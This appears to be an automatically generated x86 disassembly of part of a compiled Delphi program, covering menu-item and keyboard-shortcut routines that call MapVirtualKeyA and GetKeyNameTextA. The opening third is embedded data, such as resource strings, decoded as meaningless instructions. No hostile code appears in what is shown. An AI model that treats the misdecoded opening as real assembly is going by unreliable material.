inc ebp
add [ ecx ] cl
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
rol [ eax - 0x78 ] 0x45
add [ edi ] al
or [ ebp + ecx * 2 + 0x61 ] edx
imul ebp [ esi + 0x4d ] 0xf4756e65
xchg [ ebp ] eax
push 0xb004587
add [ 0x756e654d ] al
jae r-xdata
add [ eax + ebx * 8 ] ch
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax + 0x1c004581 ] dl
fadd [ ebp ]
sub al 0xd8
push es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0xb065646f
inc ebp
dec eax
outsd
je r-xdata
adc [ eax ] al
inc eax
add [ eax ] al
inc [ edx + edx * 8 + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
jns r-xdata
or al [ eax ]
or [ edi + 0x6e ] cl
jb r-xdata
add [ eax ] cl
add bh bh
rcl bl 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060007 ] al
mov al 0x64
inc ebp
nop
add [ ebp ] sub_45d83c
dec esp
fadd [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
or al 0x8a
inc ebp
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
jo r-xdata
outsb
je r-xdata
ja r-xdata
insd
popad
jae r-xdata
dec ecx
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + ebx * 8 + 0x45 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x75410900
je r-xdata
insd
popad
inc edx
outsd
outsb
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x6004589 ] cl
jo r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
mov [ ecx + 0x70060045 ] cl
adc [ eax ] al
inc ecx
add [ eax ] al
inc eax
add [ ecx ] al
add bh bh
mov eax 0x10045d7
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
dec ebp
jb r-xdata
add ah bl
xor [ eax ] al
nop
fild [ ebp ]
clc
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al cl
mov [ ebp ] eax
or eax 0x69526274
push 0x74754274
je r-xdata
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
or [ eax + 0x61 ] dh
jo r-xdata
je r-xdata
outsb
je r-xdata
popad
cwde
push edi
inc ecx
add [ eax ] dh
add [ eax ] al
jmp [ edi + edx * 8 - 0x2f63ffbb ]
add [ edi + ebx * 8 ] bl
inc ebp
add [ eax - 0x2d ] cl
inc ebp
add [ ebx + ecx * 8 - 0x2c87ffbb ] cl
inc ebp
add ah al
fild [ ebp ]
jl r-xdata
inc edx
add [ eax - 0x23ffbdef ] ah
adc al 0x42
inc ebp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
lea eax [ ecx ]
mov al 0x10
inc edx
add [ ecx * 4 - 0x2c9fffbf ] dl
inc ebp
add ah bh
rol [ ebp ] cl
cwde
adc [ edx ] eax
nop
adc al [ edx ]
aam 0x14
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
mov al [ ebp ]
lea eax [ eax ]
fmul [ edx + 0x45 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x8b
outsd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x7ffba21 ] dl
je r-xdata
outsd
insd
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
or [ edx + 0x6d0d0045 ] cl
popad
dec esp
je r-xdata
jb r-xdata
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9c65646f
jg r-xdata
add [ eax + ebx * 8 ] bh
inc ebp
add [ eax + ebx * 8 + 0x45 ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
outsd
je r-xdata
or eax 0x6f42616d
insd
popad
push esp
outsd
jo r-xdata
je r-xdata
jne r-xdata
int3
dec ebp
outsb
jne r-xdata
popad
inc ebx
push 0x65676e61
nop
mov [ ecx + 0xf030045 ] cs
push esp
push eax
outsd
jo r-xdata
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ eax + ebx * 8 ] bl
inc ebp
add [ eax + ebx * 8 ] ch
outsb
jne r-xdata
mov al [ ebp ]
add ecx [ edi ]
inc edx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx * 4 ] bl
inc ebp
add [ eax ] bh
add [ eax ] al
mov ah 0x86
inc ebp
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
outsd
inc edx
outsd
je r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx * 4 ] ch
je r-xdata
outsd
dec esp
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
pop es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x7465646f
pop eax
dec eax
outsd
je r-xdata
or eax 0x33840042
mov esp 0x7c004214
sub al 0x8b
inc ebp
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
xor eax [ eax ]
cld
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] ecx
outsb
add eax 0x756e654d
jae r-xdata
add [ eax ] al
add [ eax + eax ] cl
push cs
push eax
popad
jb r-xdata
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
test dl dl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
pushfd
rol [ ebp ] 0x1
add [ eax ] al
add [ eax - 0x80000000 ] al
jo r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
jns r-xdata
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
mov al 0x64
inc ebp
add [ eax ] cl
add bh bh
rcl bl 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push edi
inc ecx
add [ eax ] dh
add [ eax ] al
jmp [ edi + edx * 8 - 0x2f63ffbb ]
je r-xdata
add eax 0x75411100
je r-xdata
nop
add [ ebp ] sub_45d83c
dec esp
fadd [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
jo r-xdata
inc ebx
push 0x65676e61
loopne r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc865646f
mov [ ebp ] eax
push 0x68ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
dec ebp
outsd
enter 0x4589 0x0
mov al [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
lea eax [ ebp ]
or [ eax ] al
add [ eax ] al
js r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ebp + eax * 4 - 0x78d7ffbf ] al
inc ecx
add [ eax - 0x77 ] ch
inc ecx
add al bl
test [ ecx ] eax
push esp
xchg [ ecx ] al
xchg esp eax
fld [ ebp ]
or dl [ eax + edx * 2 + 0x6f ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ esi + ebx * 2 + 0x41 ] ah
outsb
pushfd
jg r-xdata
inc eax
add [ ebx + esi + 0x33780040 ] al
inc ecx
add [ eax ] dh
add bh bh
jo r-xdata
adc [ eax ] al
inc ecx
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
add [ eax ] 0x0
add [ eax ] al
inc ecx
add al bl
fild [ ebp ]
loopne r-xdata
rol [ ebp ] cl
mov al [ ebp ]
push 0x10004587
add [ 0x756e654d ] al
jae r-xdata
je r-xdata
sar [ ebp + ecx * 4 + 0x45 ] 0x0
jo r-xdata
mov [ ecx ] eax
fadd [ ebp - 0x79abffbf ]
inc ecx
add [ ecx + ebx * 8 + 0x540a0045 ] dl
push eax
outsd
inc edx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ ecx ] dh
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
lea eax [ ebp ]
adc al 0x0
add [ eax ] al
pop esi
lea eax [ ebp ]
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
nop
add [ ebp ] sub_45d81c
sub al 0xd8
add [ eax + 0x60004589 ] cl
add [ eax ] al
jmp [ eax ]
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add al al
mov esp 0xbd240042
inc edx
add [ edi * 4 - 0x430fffbe ] al
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
sar [ edx + eax * 2 + 0x42bd2400 ] 0x0
add al 0xbd
inc edx
add al dh
mov esp 0x540e0042
imul esi [ ebx + 0x74 ] 0x458de890
add [ eax ] al
test ebx ebx
je r-xdata
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44d0c4
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_458e34
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_4477fc
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44d0c4
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_458e8c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_458ec4
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_403eb8
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_404128
sub_458f18
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_459101
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f50
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_4040a0
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f50
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403f50
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_4040a0
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_4040a0
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_403eb8
mov eax esi
call sub_403eb8
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403f50
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_4080a8
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4041c4
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_458ec4
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404180
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f50
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404180
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_404180
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404180
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459108
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403edc
retn
sub_45911c
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_404178
push eax
mov eax edi
call sub_404178
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_404178
push eax
mov eax edi
call sub_404378
push eax
mov eax [ esi ]
call sub_404378
pop edx
pop ecx
call sub_407f88
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_404178
mov ecx eax
mov eax esi
mov edx 0x1
call sub_404418
sub_459178
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404368
xor eax eax
push ebp
push sub_459253
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_45911c
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_45911c
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_45911c
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_45911c
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45925a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403edc
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_458f18
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407f38
test eax eax
jne r-xdata
sub_459290
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_45b830
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_45b840
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_4592f0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_45b830
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_45b830
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_45b840
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45b840
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_459290
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_459290
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_45b840
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45b840
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_45943c
push ebx
mov ebx eax
mov eax ebx
call sub_455920
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_45e34c
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_459474
push ebx
mov ebx eax
mov eax ebx
call sub_455934
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4594a4
push ebx
mov ebx eax
mov eax ebx
call sub_455948
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4594d4
push ebx
mov ebx eax
mov eax ebx
call sub_455970
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_459504
push ebx
mov ebx eax
mov eax ebx
call sub_455998
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_4042c4
je r-xdata
mov al 0x1
pop ebx
retn
sub_459538
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_45595c
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_459574
push ebx
mov ebx eax
mov eax ebx
call sub_4559ac
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4595a8
push ebx
mov ebx eax
mov eax ebx
call sub_4559c0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4595dc
push ebx
mov ebx eax
mov eax ebx
call sub_4559d4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_459610
push ebx
mov ebx eax
mov eax ebx
call sub_42163c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_459638
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_459658
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45b698
sub_459678
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45b708
sub_459698
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45b75c
sub_4596b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_4596d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_403f0c
sub_4596f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45b888
sub_459718
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45b864
sub_459738
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45b878
sub_459758
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_459784
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420d38
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_459270
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
